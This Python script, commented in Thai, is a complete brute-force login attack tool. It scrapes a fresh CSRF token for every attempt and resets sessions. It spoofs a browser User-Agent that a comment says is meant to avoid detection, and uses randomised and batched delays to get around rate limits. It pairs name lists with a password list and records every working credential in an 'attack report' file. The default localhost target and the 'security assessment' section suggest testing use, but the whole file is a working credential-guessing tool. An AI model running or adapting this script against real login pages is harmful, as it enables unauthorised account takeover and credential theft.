import requests
from bs4 import BeautifulSoup
from dotenv import load_dotenv
import os
import time
import random
from datetime import datetime

# 1. โหลด environment variables
load_dotenv()

# 2. กำหนด URL จาก .env หรือใช้ค่าเริ่มต้น
base_url = os.getenv('BASE_URL', 'http://localhost:5000')  # เพิ่มค่าเริ่มต้น
login_url = f"{base_url}{os.getenv('LOGIN_URL', '/login')}"  # เพิ่มค่าเริ่มต้น

print(f"🌐 ใช้ URL: {base_url}")
print(f"🔗 Login URL: {login_url}")
print("-" * 50)

# 3. เริ่ม session เพื่อเก็บ cookies
session = requests.Session()

# ใช้ User-Agent แบบง่ายๆ เพื่อหลีกเลี่ยงการตรวจจับ
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
})

# 4. โหลดหน้า login เพื่อนำ CSRF Token
try:
    response = session.get(login_url)
    print(f"📊 Status Code: {response.status_code}")
    print(f"📍 Final URL: {response.url}")
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # 5. ดึง CSRF Token จาก input hidden
    csrf_input = soup.find('input', {'name': '__RequestVerificationToken'})
    if not csrf_input:
        print("❌ ไม่พบ CSRF Token ในหน้า login")
        print("🔍 กำลังตรวจสอบ HTML structure...")
        
        # แสดง input fields ทั้งหมดเพื่อ debug
        all_inputs = soup.find_all('input')
        print(f"พบ input fields จำนวน: {len(all_inputs)}")
        for i, input_field in enumerate(all_inputs, 1):
            input_name = input_field.get('name', 'ไม่มีชื่อ')
            input_type = input_field.get('type', 'text')
            print(f"   {i}. Name: {input_name}, Type: {input_type}")

        
        exit()
        
    csrf_token = csrf_input['value']
    print(f"🔑 CSRF Token ที่ได้: {csrf_token}")
    
except Exception as e:
    print(f"❌ เกิดข้อผิดพลาดในการโหลดหน้า login: {e}")
    print("🔍 กำลังตรวจสอบ response...")
    
    if 'response' in locals():
        print(f"Status Code: {response.status_code}")
        print(f"Response Headers: {dict(response.headers)}")
        print(f"Response Text (first 500 chars): {response.text[:500]}")
    
    exit()

# 6. อ่านข้อมูลจากไฟล์
def read_file_lines(filename):
    """อ่านข้อมูลจากไฟล์และคืนค่าเป็น list"""
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์ {filename}")
        return []

# อ่านข้อมูลจากไฟล์
fnames = read_file_lines('fname.txt')
lnames = read_file_lines('lname.txt')
passwords = read_file_lines('password.txt')

if not fnames or not lnames or not passwords:
    print("❌ ไม่สามารถอ่านข้อมูลจากไฟล์ได้")
    exit()

print(f"📊 ข้อมูลที่โหลดได้:")
print(f"   - ชื่อ: {len(fnames)} รายการ")
print(f"   - นามสกุล: {len(lnames)} รายการ") 
print(f"   - รหัสผ่าน: {len(passwords)} รายการ")
print(f"   - รวมการทดสอบ: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)} รายการ")
print("-" * 50)

# 7. วนลูปทดสอบข้อมูลจากไฟล์
attempt_count = 0
success_count = 0
successful_logins = []  # เก็บข้อมูลที่ login สำเร็จ
start_time = datetime.now()  # บันทึกเวลาเริ่มต้น

# ตั้งค่าการหน่วงเวลา
MIN_DELAY = 1.0  # หน่วงขั้นต่ำ 1 วินาที
MAX_DELAY = 5.0  # หน่วงสูงสุด 5 วินาที
BATCH_SIZE = 10   # ทดสอบ 10 ครั้งแล้วหยุดพักนาน
BATCH_DELAY = 20.0  # หยุดพัก 20 วินาทีหลังทดสอบ 10 ครั้ง
CSRF_REFRESH_INTERVAL = 1  # ดึง CSRF token ใหม่ทุกครั้ง

# เริ่มที่ password ก่อน (outer loop)
for password in passwords:
    print(f"\n🔐 ทดสอบรหัสผ่าน: {password}")
    print("=" * 40)
    
    for i in range(len(fnames)):
        if i < len(lnames):
            fname = fnames[i]
            lname = lnames[i]
            attempt_count += 1

            # Reset session ทุกครั้งที่วนลูป
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            })

            # ตรวจสอบการหยุดพักหลังทดสอบหลายครั้ง
            if attempt_count % BATCH_SIZE == 0:
                print(f"🛑 หยุดพักหลังทดสอบ {BATCH_SIZE} ครั้ง...")
                print(f"⏳ หน่วงเวลา {BATCH_DELAY} วินาที...")
                time.sleep(BATCH_DELAY)
                print("▶️ เริ่มทดสอบต่อ...")
                print("-" * 30)

            print(f"🔍 ทดสอบครั้งที่ {attempt_count}: {fname} {lname} / {password}")

            # ดึง CSRF Token ใหม่
            print(f"🔄 ดึง CSRF Token ใหม่ (ครั้งที่ {attempt_count})...")
            try:
                login_page_response = session.get(login_url)
                print(f"URL ที่ได้: {login_page_response.url}")
                if not login_page_response.url.endswith('/login'):
                    print("❌ ไม่ได้อยู่ที่หน้า /login อาจโดน redirect")
                    continue
                login_soup = BeautifulSoup(login_page_response.text, 'html.parser')
                csrf_input = login_soup.find('input', {'name': '__RequestVerificationToken'})
                if not csrf_input:
                    print("❌ ไม่พบ CSRF Token ใหม่")
                    continue
                csrf_token = csrf_input['value']
                print(f"🔑 CSRF Token ใหม่: {csrf_token[:20]}...")
            except Exception as e:
                print(f"❌ ไม่สามารถดึง CSRF Token ใหม่ได้: {e}")
                continue

            # เตรียมข้อมูลสำหรับ POST
            login_data = {
                '__RequestVerificationToken': csrf_token,
                'FName': fname,
                'LName': lname,
                'Password': password
            }

            # ส่ง POST ไปยังฟอร์ม login
            try:
                post_response = session.post(login_url, data=login_data)
                print(f"📡 POST Response Status: {post_response.status_code}")
                print(f"📍 POST Response URL: {post_response.url}")
                print(f"📡 POST Data: {login_data}")

                # ตรวจสอบ response headers
                if 'Set-Cookie' in post_response.headers:
                    print("🍪 ได้รับ cookies ใหม่")

                # ตรวจสอบผลลัพธ์
                response_text = post_response.text.strip()
                print(f"📄 Response Text: {response_text[:200]}...")

                if response_text.lower() == "true":
                    print("✅ Login สำเร็จ (ระบบตอบ true)")
                    success_count += 1
                    successful_logins.append({
                        'attempt': attempt_count,
                        'fname': fname,
                        'lname': lname,
                        'password': password,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    })
                else:
                    print("❌ Login ล้มเหลว (ระบบตอบ false)")

            except Exception as e:
                print(f"❌ เกิดข้อผิดพลาดในการส่ง POST: {e}")
                try:
                    with open(f'error_response_{attempt_count}.html', 'w', encoding='utf-8') as f:
                        f.write(post_response.text if 'post_response' in locals() else str(e))
                    print(f"💾 บันทึก error response ลงไฟล์ error_response_{attempt_count}.html")
                except:
                    pass

            # หยุดพักเล็กน้อยเพื่อไม่ให้ server รับภาระมากเกินไป
            delay = random.uniform(MIN_DELAY, MAX_DELAY)
            print(f"⏳ หน่วงเวลา {delay:.1f} วินาที...")
            time.sleep(delay)
            print("-" * 30)

# 8. สรุปผลลัพธ์
end_time = datetime.now()
duration = end_time - start_time

print("\n" + "=" * 50)
print("📈 สรุปผลการทดสอบ:")
print(f"   - จำนวนครั้งที่ทดสอบ: {attempt_count}")
print(f"   - จำนวนครั้งที่สำเร็จ: {success_count}")
print(f"   - จำนวนครั้งที่ล้มเหลว: {attempt_count - success_count}")
print(f"   - เวลาเริ่มต้น: {start_time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"   - เวลาสิ้นสุด: {end_time.strftime('%Y-%m-%d %H:%M:%S')}")
print(f"   - ระยะเวลาที่ใช้: {duration}")
print("=" * 50)
print("🎯 การทดสอบเสร็จสิ้น!")

# 9. บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt ในรูปแบบ log 
def save_results_to_log():
    """บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt ในรูปแบบ log"""
    
    # ป้องกัน ZeroDivisionError
    success_rate = (success_count/attempt_count*100) if attempt_count > 0 else 0
    avg_time = (duration.total_seconds()/attempt_count) if attempt_count > 0 else 0
    
    # สร้างเนื้อหา log
    log_content = f"""
================================================================================
BRUTE FORCE LOGIN ATTACK REPORT
================================================================================

EXECUTION DETAILS:
    Target URL: {base_url}
    Start Time: {start_time.strftime('%Y-%m-%d %H:%M:%S')}
    End Time: {end_time.strftime('%Y-%m-%d %H:%M:%S')}
    Duration: {duration}
    Total Attempts: {attempt_count}
    Successful Logins: {success_count}
    Failed Attempts: {attempt_count - success_count}
    Success Rate: {success_rate:.2f}%

ATTACK PARAMETERS:
    FName Records: {len(fnames)}
    LName Records: {len(lnames)}
    Password Records: {len(passwords)}
    Test Combinations: {len([f + l for f, l in zip(fnames, lnames)]) * len(passwords)}
    Delay Range: {MIN_DELAY}-{MAX_DELAY} seconds
    Batch Size: {BATCH_SIZE}
    Batch Delay: {BATCH_DELAY} seconds

SUCCESSFUL LOGINS:
"""
    
    if successful_logins:
        log_content += """    +----+----------------+----------------------+------------+---------------------+
    | ID | First Name     | Last Name            | Password   | Timestamp           |
    +----+----------------+----------------------+------------+---------------------+
"""
        for i, login in enumerate(successful_logins, 1):
            fname_padded = f"{login['fname']:<14}"
            lname_padded = f"{login['lname']:<20}"
            password_padded = f"{login['password']:<10}"
            log_content += f"    | {i:2d} | {fname_padded} | {lname_padded} | {password_padded} | {login['timestamp']} |\n"
        log_content += "    +----+----------------+----------------------+------------+---------------------+\n"
    else:
        log_content += "    NO SUCCESSFUL LOGINS FOUND\n"
    
    log_content += f"""
ATTACK STATISTICS:
    +------------------------+----------+
    | Metric                 | Value    |
    +------------------------+----------+
    | Total Attempts         | {attempt_count:8d} |
    | Successful Logins      | {success_count:8d} |
    | Failed Attempts        | {attempt_count - success_count:8d} |
    | Success Rate           | {success_rate:7.2f}% |
    | Average Time per Test  | {avg_time:7.2f}s |
    +------------------------+----------+

SECURITY ASSESSMENT:
    Risk Level: {'HIGH' if success_count > 0 else 'LOW'}
    Vulnerable Accounts: {success_count}
    Attack Effectiveness: {success_rate:.2f}%
    Recommendations: {'Immediate password policy review required' if success_count > 0 else 'Current security measures appear effective'}

================================================================================
REPORT GENERATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
================================================================================

"""
    
    # บันทึกลงไฟล์ (append mode)
    try:
        with open('brute_force_results.txt', 'a', encoding='utf-8') as f:
            f.write(log_content)
        print("💾 บันทึกผลลัพธ์ลงไฟล์ brute_force_results.txt แล้ว")
    except Exception as e:
        print(f"❌ ไม่สามารถบันทึกผลลัพธ์ได้: {e}")

# เรียกใช้ฟังก์ชันบันทึกผลลัพธ์
save_results_to_log()